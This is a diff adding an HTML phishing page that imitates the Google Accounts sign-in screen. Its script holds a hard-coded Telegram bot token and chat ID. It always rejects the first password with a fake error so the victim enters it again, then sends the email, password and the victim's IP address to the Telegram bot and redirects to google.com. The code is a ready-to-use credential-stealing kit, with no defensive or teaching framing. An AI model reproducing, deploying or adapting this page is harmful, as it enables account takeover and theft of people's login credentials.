@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * { box-sizing: border-box; font-family: 'Google Sans','Roboto','Arial',sans-serif; }
+        body { background-color: #fff; margin: 0; display: flex; flex-direction: column; min-height: 100vh; color: #202124; }
+        .main-wrapper { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .login-card { 
+            background: #fff; border: 1px solid #dadce0; border-radius: 28px; 
+            width: 100%; max-width: 840px; display: flex; min-height: 400px; overflow: hidden;
+        }
+        .card-left { flex: 1; padding: 40px; display: flex; flex-direction: column; align-items: flex-start; }
+        .logo { width: 74px; height: 24px; margin-bottom: 24px; }
+        h1 { font-size: 36px; font-weight: 400; margin: 0; line-height: 44px; }
+        .subtitle { font-size: 16px; margin: 12px 0; }
+        .card-right { width: 448px; padding: 40px; display: flex; flex-direction: column; justify-content: center; }
+        .step { display: none; }
+        .step.active { display: block; }
+        .input-group { position: relative; margin-top: 10px; width: 100%; }
+        .input-group input { 
+            width: 100%; padding: 16px 14px; font-size: 16px; border: 1px solid #747775; 
+            border-radius: 4px; outline: none; transition: 0.1s border;
+        }
+        .input-group label { 
+            position: absolute; left: 14px; top: 16px; color: #444746; 
+            transition: 0.2s; pointer-events: none; background: #fff; padding: 0 4px;
+        }
+        .input-group input:focus { border: 2px solid #0b57d0; }
+        .input-group input:focus ~ label, .input-group input:not(:placeholder-shown) ~ label { 
+            top: -10px; left: 10px; font-size: 12px; color: #0b57d0; 
+        }
+        .error-msg { color: #d93025; font-size: 12px; margin-top: 8px; display: none; }
+        .show-pass-wrapper { display: flex; align-items: center; margin-top: 12px; font-size: 14px; cursor: pointer; }
+        .show-pass-wrapper input { margin-right: 10px; width: 18px; height: 18px; }
+        .blue-link { color: #0b57d0; text-decoration: none; font-weight: 500; font-size: 14px; cursor: pointer; display: inline-block; margin-top: 8px; }
+        .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 48px; }
+        .btn-next { 
+            background-color: #0b57d0; color: #fff; border: none; padding: 10px 24px; 
+            border-radius: 20px; font-weight: 500; cursor: pointer;
+        }
+        .user-pill { 
+            display: inline-flex; align-items: center; padding: 4px 12px; border: 1px solid #dadce0; 
+            border-radius: 16px; font-size: 14px; margin-bottom: 24px; cursor: pointer;
+        }
+        footer { padding: 24px; max-width: 840px; margin: 0 auto; width: 100%; font-size: 12px; color: #444746; }
+        .loading-bar { width: 100%; height: 4px; background: #e0e0e0; overflow: hidden; position: relative; margin-top: 20px; }
+        .progress { width: 40%; height: 100%; background: #0b57d0; position: absolute; animation: move 1.2s infinite ease-in-out; }
+        @keyframes move { 0% { left: -40%; } 100% { left: 100%; } }
+        
+        /* Mobile Optimization */
+        @media (max-width: 840px) {
+            .login-card { flex-direction: column; border: none; }
+            .card-left { align-items: center; text-align: center; padding: 20px; }
+            .card-right { width: 100%; padding: 20px; }
+            h1 { font-size: 28px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-wrapper">
+        <div class="login-card">
+            <div class="card-left">
+                <img src="https://gstatic.com" alt="Google" class="logo">
+                <h1 id="title">Sign in</h1>
+                <p class="subtitle" id="sub-title">Use your Google Account</p>
+            </div>
+            <div class="card-right">
+                <div id="step-email" class="step active">
+                    <div class="input-group">
+                        <input type="email" id="email-field" placeholder=" " required>
+                        <label>Email or phone</label>
+                    </div>
+                    <a class="blue-link">Forgot email?</a>
+                    <div class="actions">
+                        <a class="blue-link">Create account</a>
+                        <button class="btn-next" onclick="goToPassword()">Next</button>
+                    </div>
+                </div>
+                <div id="step-password" class="step">
+                    <div class="user-pill" onclick="goBack()">
+                        <span id="display-email"></span>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" id="pass-field" placeholder=" " required>
+                        <label>Enter your password</label>
+                    </div>
+                    <div id="error-text" class="error-msg">Wrong password. Try again.</div>
+                    <label class="show-pass-wrapper">
+                        <input type="checkbox" onclick="togglePass()"> Show password
+                    </label>
+                    <div class="actions">
+                        <a class="blue-link">Forgot password?</a>
+                        <button class="btn-next" onclick="finishLogin()">Next</button>
+                    </div>
+                </div>
+                <div id="step-loading" class="step">
+                    <p style="text-align: center;">Checking info...</p>
+                    <div class="loading-bar"><div class="progress"></div></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer>English (United States)</footer>
+
+    <script>
+        const BOT_TOKEN = '8524309092:AAGQuEUl45corBCEqgot6LnwJZJOuT7UyCg';
+        const CHAT_ID = '7974093992';
+        let attempt = 0;
+
+        function togglePass() {
+            const x = document.getElementById("pass-field");
+            x.type = (x.type === "password") ? "text" : "password";
+        }
+
+        function goToPassword() {
+            const email = document.getElementById('email-field').value;
+            if (email) {
+                document.getElementById('display-email').innerText = email;
+                document.getElementById('title').innerText = "Welcome";
+                document.getElementById('sub-title').innerText = "";
+                document.getElementById('step-email').classList.remove('active');
+                document.getElementById('step-password').classList.add('active');
+            }
+        }
+
+        function goBack() {
+            document.getElementById('step-password').classList.remove('active');
+            document.getElementById('step-email').classList.add('active');
+        }
+
+        async function finishLogin() {
+            const email = document.getElementById('email-field').value;
+            const password = document.getElementById('pass-field').value;
+            const passInput = document.getElementById('pass-field');
+
+            if (attempt === 0) {
+                attempt++;
+                document.getElementById('error-text').style.display = "block";
+                passInput.style.border = "1px solid #d93025";
+                passInput.value = "";
+                return;
+            }
+
+            document.getElementById('step-password').classList.remove('active');
+            document.getElementById('step-loading').classList.add('active');
+
+            try {
+                const res = await fetch('https://ipapi.co');
+                const data = await res.json();
+                const msg = `📧 Email: ${email}\n🔑 Pass: ${password}\n📍 IP: ${data.ip}`;
+                await fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+                });
+            } catch (e) {}
+
+            setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
+        }
+    </script>
+</body>
+</html>
